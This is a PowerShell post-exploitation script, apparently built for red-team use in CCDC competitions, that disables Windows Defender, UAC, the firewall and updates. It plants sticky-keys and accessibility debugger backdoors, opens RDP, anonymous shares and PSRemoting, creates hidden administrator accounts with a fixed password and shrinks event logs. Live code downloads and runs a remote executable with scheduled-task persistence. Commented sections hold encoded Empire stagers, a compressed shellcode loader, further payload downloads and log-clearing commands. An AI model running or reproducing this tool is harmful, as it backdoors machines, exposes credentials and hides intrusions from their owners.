## Set-ExecutionPolicy Unrestricted
## 4th gen win-jericho, powershell inspired pain
function Jerricho
{

<#
.SYNOPSIS
This script drops all the things, think cluster bomb
.DESCRIPTION
This script drops all the things, think cluster bomb
.PARAMETER Truth
You cant handle the truth
.EXAMPLE
PS C:\> Set-ExecutionPolicy Unrestricted -Force
PS C:\> iex (( new-object net.webclient).downloadstring('https://remotehost/jerricho4.ps1'))
.LINK
https://github.com/ccdc/
.NOTES
This script was inspired by cmc's orginal nastiness, 2 generations of win-jericho (mubix), and PowerShell cash money.
Author: https://github.com/ahhh/
Get-Some
#>

	[CmdletBinding()] Param(
	
		[Parameter(Mandatory = $false, ValueFromPipeline=$true)]
		[Alias("t", "Pwnd")]
		[Switch]
		$Truth = $True

	)


	# Shhh
	$ErrorActionPreference='SilentlyContinue'


	#
	# Disable UAC
	#
	try {
		Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableUAC" -Value "0"
	} catch {}
	

	#
	# Stop Security Center Notifications
	#
	try {
		Remove-Item -Path "HKEY_CLASSES_ROOT\CLSID\{FD6905CE-952F-41F1-9A6F-135D9C6622CC}"
	} catch {}
	

	#
	# Windows Defender Exclusion Paths First
	#
	try {
		Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\" -Value "0" 
		Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\" -Value "0" 
		Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\System32\" -Value "0" 
		Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp\" -Value "0" 
		Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Fonts\" -Value "0"
	} catch {}


	#
	# Win10 Disable WindowsDefender
	#
	try{
		# Turn-off real-time protection
		Set-MpPreference -DisableRealtimeMonitoring $true
		# Remove Defender after reboot
		Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI
	} catch {}
	

	#
	# Enable Wdigest cached creds in lsass on Win10
	#
	try{
		Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value "1"
	} catch {}

	#
	# Force "Hidden" files to not be visable in Explorer
	#
	try{
		Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN" -Name "CheckedValue" -Value "0"
		Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN" -Name "DefaultValue" -Value "0"
		Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" -Name "CheckedValue" -Value "0"
		Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" -Name "DefaultValue" -Value "0"
		Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden" -Name "CheckedValue" -Value "0"
		Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden" -Name "DefaultValue" -Value "0"
		Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoFolderOptions" -Value "1"
	} catch {}


	#
	# Disable Updates on Win10
	#
	try{
		Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "AUOptions" -Value "1"
		Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "UseWUServer" -Value "1"
		Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "WUServer" -Value "http://127.0.0.1"
		Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "WUStatusServer" -Value "http://127.0.0.1"
		Set-ItemProperty -Path "HKLM:\SYSTEM\Internet Communication Management\Internet Communication" -Name "DisableWindowsUpdateAccess" -Value "1"
	} catch {}

	#
	# OldSkool Disable Updates
	# Works on Win7
	#	
	try{
		REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 1 /f
		REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v UseWUServer /t REG_DWORD /d 1 /f
		REG ADD "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" /F /v WUServer /t REG_SZ /d http://127.0.0.1
		REG ADD "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" /F /v WUStatusServer /t REG_SZ /d http://127.0.0.1

		REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /F /v NoWindowsUpdate /t REG_DWORD /d 1
		REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\Internet Communication Management\Internet Communication" /F /v DisableWindowsUpdateAccess /t REG_DWORD /d 1
		REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate" /F /v DisableWindowsUpdateAccess /t REG_DWORD /d 1

		echo 127.0.0.1 windowsupdate.microsoft.com >> \windows\system32\drivers\etc\hosts
	} catch {}


	#
	# Enable RDP and sethc backdoor
	# Works on most all versions of windows
	# Don't move cmd!
	#
	try{
		REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
		REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
		REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f

		REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnifier.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
		REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\OSK.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
		REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Narrator.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f

		REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f


		Start-Service TermService
		netsh firewall set service type=remotedesktop mode=enable
		netsh advfirewall firewall set rule group="remote desktop" new enable="Yes"
	} catch {}
	

	#
	# Enable C:\ as a full control share for everyone w/ Anonymous access
	# Available on Win8.1 and 2012R2
	#
	try{
		netsh firewall set service type=fileandprint mode=enable profile=all
		netsh advfirewall firewall set rule group=”network discovery” new enable=yes
		New-SmbShare -Name "Share" -Path "C:\" -FullAccess "Anonymous Logon"
	} catch {}
	
	
	#
	# Enable PSRemoting
	#
	try{
		Enable-PSRemoting -force
		winrm quickconfig -quiet
		# Whitelist all as trusted hosts
		Set-Item -force wsman:\localhost\client\trustedhosts * 
		restart-service WinRM
	} catch {}
	

	#
	# Enable SMBv1
	# Win8 / Srv12
	#
	try{
		Set-SmbServerConfiguration -EnableSMB1Protocol $true
	} catch{}
	# Win7 / Srv08 / Vista
	try{
		Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" SMB1 -Type DWORD -Value 1 -Force
	} catch{}

	#
	# Enable Administrative Shares on Workstation
	#
	try {
		reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /f /v AutoShareWks /t REG_DWORD /d 1
	} catch {}
	# Enable Administrative Shares on Server
	try{
		reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /f /v AutoShareServer /t REG_DWORD /d 1
	} catch {}

	#
	# Disable Firewall
	# Available on Win8.1 and 2012R2
	#
	try{
		Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
	} catch {}
	
	#
	# Disable Firewall on boot
	# Available on Win7
	#
#	try{
#		set-service -name "MpsSvc" -Status stopped -startuptype disabled	
#	} catch {} # Has dependant services

	#
	# Disable EMET
	#
	try{
		set-service -name "EMET_Service" -Status stopped -startuptype disabled	
	} catch{}

	#
	# Enable SecLogon / Secondary Logon
	#
	try {
		set-service -name "seclogon" -Status Running -startuptype Automatic	
	} catch {}


	#
	# Drop Firewall
	# Works like water
	#
	try{
		netsh firewall set opmode disable
	} catch {}


	#
	# Enable Reversable Password for Administrator
	#
	try{
		Set-ADAccountControl -Identity Administrator -AllowReversiblePasswordEncryption
	} catch {}


	#
	# Make sure Administrator is Enabled
	#
	try{
		net user Administrator /active:yes
	} catch {}


	#
	# Create New User Accounts
	#
	try{
		$computername = $env:computername
		$username = 'ScoreBot'
		$password = 'Password1!'
		$desc = 'Whiteteam score bot account'
		$computer = [ADSI]"WinNT://$computername,computer"
		$user = $computer.Create("user", $username)
		$user.SetPassword($password)
		$user.Setinfo()
		$user.description = $desc
		$user.setinfo()
		$user.UserFlags = 64 + 65536
		$user.SetInfo()
		$group = [ADSI]("WinNT://$computername/administrators,group")
		$group.add("WinNT://$username,user")
	} catch {}

	
	try{
		$computername = $env:computername
		$username = 'admin'
		$password = 'Password1!'
		$desc = ''
		$computer = [ADSI]"WinNT://$computername,computer"
		$user = $computer.Create("user", $username)
		$user.SetPassword($password)
		$user.Setinfo()
		$user.description = $desc
		$user.setinfo()
		$user.UserFlags = 64 + 65536
		$user.SetInfo()
		$group = [ADSI]("WinNT://$computername/administrators,group")
		$group.add("WinNT://$username,user")
	} catch {}
	

	#
	# Enable Guest Account
	#
	try{
		$computername = $env:computername
		$username = 'Guest'
		$password = 'Password1!'
		$desc = ''
		$computer = [ADSI]"WinNT://$computername,computer"
		$user = $computer.Create("user", $username)
		$user.SetPassword($password)
		$user.Setinfo()
		$user.description = $desc
		$user.setinfo()
		$user.UserFlags = 512
		$user.SetInfo()
		$group = [ADSI]("WinNT://$computername/administrators,group")
		$group.add("WinNT://$username,user")	
	} catch {}
	

	#
	# Disable SafeBoot
	#
	try{
		bcdedit /set bootems off
		bcdedit /set advancedoptions off
		bcdedit /set optionsedit off
		bcdedit /set bootstatuspolicy IgnoreAllFailures
		bcdedit /set recoveryenabled off
		bcdedit /set graphicsmodedisabled true
	} catch {}


	#
	# Make some extra copies of the powershell binary
	#
	try{
		cp C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\System32\ps.exe
		cp C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Resources\ps.exe
	} catch {}


	#
	# Persist on ScheduledTask's OnIdle
	#
#	try{
#		# The script to persist
#		$url_01 = "https://raw.githubusercontent.com/ahhh/PSSE/master/sample_bind_shell.ps1"
#		#
#		$storageDir = "C:\Windows\Fonts"
#		$webclient = New-Object System.Net.WebClient
#		$file_01 = "$storageDir\diagnostics.ps1"
#		$webclient.DownloadFile($url_01,$file_01)
#		# Hide our file
#		Set-ItemProperty -Path $file_01 -Name Attributes -Value ((Get-ItemProperty -Path test.ps1).Attributes -bxor [System.IO.FileAttributes]::Hidden)
#		schtasks /Create /RU system /SC ONIDLE /I 1 /TN Lpktask /TR "powershell -NoLogo -WindowStyle hidden -file $file_01"
#	} catch {}


	#
	# Persist on ScheduledTask and run Week's drop fw payload every hour
	# Works via local and group domain policy
	#
#	try{
#		# The script to persist
#		$url_02 = "https://scriptjunkie.us/fw.ps1"
#		#
#		$storageDir = "C:\Windows\System32"
#		$webclient = New-Object System.Net.WebClient
#		$file_02 = "$storageDir\netstats.ps1"
#		$webclient.DownloadFile($url_02,$file_02)
#		schtasks /create /tn WinTask /tr "powershell -NoLogo -WindowStyle hidden -file $file_02" /sc hourly /ru System
#		start powershell.exe -ArgumentList "-Command iex $file_02"
#	} catch {}
        


	#
	# Download run and persist Week's Present payload
	# adds user (ntds:fw5170BZk7oEqm)
	#
	try{
		$url_03 = "https://scriptjunkie.us/present.exe"
		#
		$storageDir = "C:\Windows\System32"
		$webclient = New-Object System.Net.WebClient
		$file_03 = "$storageDir\ntfsd.exe"
		$webclient.DownloadFile($url_03,$file_03)
		schtasks /Create /RU system /SC hourly /TN ntfsd /TR "$file_03"
		start C:\Windows\System32\ntfsd.exe
	} catch {}


	#
	# Use this to run cmc's Empire
	#
#	try{
#		# The script to persist
#		$Script_01 = "powershell.exe -NoP -sta -NonI -W Hidden -Enc JABXAGMAPQBOAEUAVwAtAE8AQgBqAGUAYwB0ACAAUwB5AHMAdABlAE0ALgBOAGUAVAAuAFcAZQBCAEMAbABpAEUAbgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBjAC4ASABFAGEARABFAFIAcwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBDAC4AUAByAG8AeAB5ACAAPQAgAFsAUwBZAHMAVABFAG0ALgBOAEUAVAAuAFcAZQBiAFIAZQBRAHUARQBTAFQAXQA6ADoARABFAGYAYQB1AGwAVABXAGUAYgBQAHIAbwBYAHkAOwAkAFcAQwAuAFAAUgBvAFgAeQAuAEMAUgBlAGQARQBOAHQASQBBAEwAUwAgAD0AIABbAFMAWQBzAHQAZQBtAC4ATgBFAFQALgBDAHIARQBkAEUATgB0AGkAQQBMAEMAQQBjAEgARQBdADoAOgBEAEUAZgBBAHUATABUAE4AZQBUAFcAbwByAGsAQwBSAGUARABlAG4AVABJAGEAbABTADsAJABLAD0AJwA4AGYAMAAzADYAMwA2ADkAYQA1AGMAZAAyADYANAA1ADQAOQA0ADkAZQA1ADkANABmAGIAOQBlADAAYQAyAGQAJwA7ACQASQA9ADAAOwBbAEMAaABBAHIAWwBdAF0AJABiAD0AKABbAGMAaABBAHIAWwBdAF0AKAAkAHcAQwAuAEQAbwBXAE4ATABPAGEARABTAHQAcgBJAE4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADMAMgAuADMAMwAuADMAOgA4ADAAOAAwAC8AaQBuAGQAZQB4AC4AYQBzAHAAIgApACkAKQB8ACUAewAkAF8ALQBiAFgAbwBSACQAawBbACQAaQArACsAJQAkAGsALgBMAGUATgBHAFQASABdAH0AOwBJAEUAWAAgACgAJABCAC0AagBPAEkAbgAnACcAKQA="
#		start powershell.exe -ArgumentList "-Command $Script_01"
#	} catch {}
#
#
#	#
#	# Use this to drop Shields TS callback
#	#
#	try{
#		$Script_02 = "powershell.exe -NoP -w Hidden -Enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAyADAAMAAuADEAMAA0AC4AMgAyADcAOgA4ADAALwBsAG8AZwBpAG4AJwApACkA"
#		 start powershell.exe -ArgumentList "-Command $Script_02"
#	} catch {}
#
#
#	#
#	# Use this to drop Week's shell shepard
#	#
#	try{
#		powershell.exe -nop -c 'if([IntPtr]::Size -eq 4){$b=''powershell.exe''}else{$b=$env:windir+''\syswow64\WindowsPowerShell\v1.0\powershell.exe''};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=''-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''''H4sIALkyGlcCA7VWa2/aSBT9nEr9D1aFZFtywDzaNJEqrQ04QDCBmDdF0cQew8DgIeNxeHT73/ca7IZsk91Wq7VAnse9M3fOOfeO/ShwBWGBtBx2pW/v3521EUcrScl4t+ONJmXIQG/eF/xiST07g9kMbjVcdtuQvkjKxFivK2yFSDC9uipHnONAHPvZayyMMMSrB0pwqKjSn9Jgjjk+v31YYFdI36TMffaasgdEE7NdGblzLJ0bgRfPNZmL4qiyzpoSochfv8rq5Dw/zVYfI0RDRXZ2ocCrrEeprErf1XjD7m6NFdkmLmch80V2QIJiIdsLQuTjFqz2hG0s5swLZRUOAj+ORcQDKT1SvMbRQpGh2ebMNTyP4xAcsvXgiS2xkgkiSjXpD2WSBHAXBYKsMMwLzNnawfyJuDjM1lDgUXyH/anSwpv03L/qpJw6gVVbcFUDTl6P1GZeRPHRWVZ/jvVApQrPCzoBhO/v371/56cCEJ8IuRCnGoDW2eTQxhCo0mYhOVh+kXRNsmE/JBjfQTfT5RFWp9Ik5mAynUqZpT3a3Hn3rOJpb6+ST13AYbEdwcikz4g3BY+EokwwvsfBLnoc3dxfxvNvS66CfRLgyi5AK+KmqlJeQx/7FB+OnE3NWhCbIicT2KtgimdIxGBq0uRnt+qKiB++ZkSoh7nhAoMhRAXkqi+DOfKjyPXAxisA7NiXgQ0ftIxT60S/u3T3uA9GcpmiMNSkdgTJ5GqSgxHFniYZQUiSKSMS7NCUn8O1IyqIi0KRLjdV/45nsm+ZBaHgkQtcAgZdZ41dgmgMiSbViIfNnUNm6f7yq4CUEaUkmMFKT0AIjMRAOCJWCIdQT9SgZh0s6qs1xSuwPOS4RdEMMjpJioOw0Ax78lvxpso/yjxGKIXmJFqg3aFMaFKfcAElI0YbJPZfYjmpGC+iKnOcsKWkOTUxdyLOgwyzxu1iNxZuAtoBIi4AHouzlYlC/KnkCA7gKR9yt6RswDOqB9R2zSXJGxuSr9vw75FinVUuvJvGopbjle3cN+ph3a61K51arfTUcPol4VTr4qZdF3Z1uFg4Ru2uNxLjulHrEn05Ku3XDbJ3moY32uY+7c39Rje3+8XM80cV359d+M5d/qNFmoNyx9QLqFmpRs2BuTH1Ulglm1qH9DrLhiUeRn2Ken5uNsxfIrJt8kU/z+x93TCu50V33/D713Pb241quctBaWlUDaMcVPuWyW5GJjfauT6a9Vl5rZfHg1nZMC2X4HGnZ5mdjmUavevFY+UyNwPfIZqbg36BjNfDuzn0LQjBzumluoe37HNzQPpP8Vrmo2mNh8hojndWLpcfhQW0NJlhAojW+BFiGq2tNgX/bq/AjD5tPdt2apUbd5y/CO0vH2J2gd7M+rHo7fl+6J8Q9latthEP54gCkVCB0xyzGLeSctpmJPZQlPheXWIeYAq3EdxXqSINSpkbV/Wk7sKdcqz0U0ixHjSLhVdbqvTDUH0u9unQ1dUYwgSZH5WXbeJgJuaavi3qOhRtfVvS4bS/frgyW++UZDEtLvvPID1vQg+bqLHyM2Hnc6M1bHZvF/nN/wpjknZzeHn/DuPz2D/M/hK0unYCwU9zLwd+C+rfBWCAiABDB2oHxccr7i0cEuWcfBuc0gTq8JMn/lK7jcR5Cz4d/gJyUVM5GgoAAA==''''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=''Hidden'';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);'
#	} catch {}
#
#	#
#	# Download and run SaltMinion
#	#
#	try{
#		# x64 / 64bit machine
#		$os_type = (Get-WmiObject -Class Win32_ComputerSystem).SystemType -match '(x64)'
#		if ($os_type -eq "True") {
#			# Download our installer
#			$url_07 = "http://10.132.33.3/saltmin64.exe"
#			$storageDir = "C:\Windows\Resources"
#			$webclient = New-Object System.Net.WebClient
#			$file_07 = "$storageDir\saltmin64.exe"
#			$webclient.DownloadFile($url_07,$file_07)
#			# Dynamic minion naming based on "win _ hostname _ time"
#			$name = "win_"+$(hostname)+"_"+$(Get-Date -Format s)
#			# Install and run the minion w/ the master IP
#			start C:\Windows\Resources\saltmin64.exe -ArgumentList "/S /master=10.132.33.3 /minion-name=$name /start-service=1"
#		}else{
#			# x86 / 32bit machine
#    		$os_type = (Get-WmiObject -Class Win32_ComputerSystem).SystemType -match '(x86)'
#    		if ($os_type -eq "True") {
#				# Download our installer
#				$url_09 = "http://10.132.33.3/saltmin32.exe"
#				$storageDir = "C:\Windows\Resources"
#				$webclient = New-Object System.Net.WebClient
#				$file_09 = "$storageDir\saltmin32.exe"
#				$webclient.DownloadFile($url_09,$file_09)
#				# Dynamic minion naming based on "win _ hostnmae _ time"
#				$name = "win_"+$(hostname)+"_"+$(Get-Date -Format s)
#				# Install and run the minion w/ the master IP
#				start C:\Windows\Resources\saltmin32.exe -ArgumentList "/S /master=10.132.33.3 /minion-name=$name /start-service=1"
#    		}
#		}
#	} catch {}
#		
#
#	#	
#	# Dropping Alex's payload
#	#
#	try{
#		# x64 / 64bit machine
#		$os_type = (Get-WmiObject -Class Win32_ComputerSystem).SystemType -match '(x64)'
#		if ($os_type -eq "True") {
#			# Download our installer
#			$url_07 = "http://10.132.33.3/gemini64.exe"
#			$storageDir = "C:\Windows\System32"
#			$webclient = New-Object System.Net.WebClient
#			$file_07 = "$storageDir\bridgecfg.exe"
#			$webclient.DownloadFile($url_07,$file_07)
#			start C:\Windows\System32\bridgecfg.exe
#		}else{
#			# x86 / 32bit machine
#    		$os_type = (Get-WmiObject -Class Win32_ComputerSystem).SystemType -match '(x86)'
#    		if ($os_type -eq "True") {
#				# Download our installer
#				$url_09 = "http://10.132.33.3/gemini32.exe"
#				$storageDir = "C:\Windows\System32"
#				$webclient = New-Object System.Net.WebClient
#				$file_09 = "$storageDir\bridgecfg.exe"
#				$webclient.DownloadFile($url_09,$file_09)
#				start C:\Windows\System32\bridgecfg.exe
#    		}
#		}
#	} catch {}

	#
	# Set Max Log Size to really small
	#
	try{
		reg add "HKLM\Software\Policies\Microsoft\Windows\EventLog\Application" /v MaxSize /t REG_DWORD /d 0x00001
		reg add "HKLM\Software\Policies\Microsoft\Windows\EventLog\Security" /v MaxSize /t REG_DWORD /d 0x00001 
		reg add "HKLM\Software\Policies\Microsoft\Windows\EventLog\System" /v MaxSize /t REG_DWORD /d 0x00001 
	} catch {}
	
	#
	# Disable Log Auditing for both Succss and Failure
	#
#	try{
#		auditpol /clear /category:*
#	} catch {}
#	
#	#
#	# Disable Logging
#	#
#	try{
##    	Stop-Service -Name eventlog -Force -Verbose
#	} catch {}
#	try{
#		Set-Service -ServiceName eventlog -StartupType Disabled
#	} catch{}
#
#	#
#	# Clear All Logs
#	#
#	try{
#		wevtutil el | Foreach-Object {wevtutil cl "$_"}
#	} catch {}
#
#	# Clear some extra logs individually
#	try{
#		Clear-EventLog Security
#	} catch {}
#	try{
#		Clear-EventLog Application
#	} catch {}
#	try {
#		Clear-EventLog System
#	} catch {}
#	try {
#		Clear-EventLog Sysmon
#	} catch {}
#
#
#	#
#	# Remove Windows Updates
#	#
##	try{
##		$Searcher = New-Object -ComObject Microsoft.Update.Searcher
##		$RemoveCollection = New-Object -ComObject Microsoft.Update.UpdateColl
##		$SearchResult = $Searcher.Search("IsInstalled=1")
##		$SearchResult.Updates | % { $RemoveCollection.Add($_) }
##		if ($RemoveCollection.Count -gt 0) {
##			$Installer = New-Object -ComObject Microsoft.Update.Installer
##			$Installer.Updates = $RemoveCollection
##			$Installer.Uninstall()
##		} else {}
##	} catch {}
#
#
#	#
#	# Last thing we do is remove logs
#	# Remove PowerShell Logs
#	#
#	try{
#		Clear-EventLog "Windows PowerShell";
#	} catch {}

	
}

Jerricho
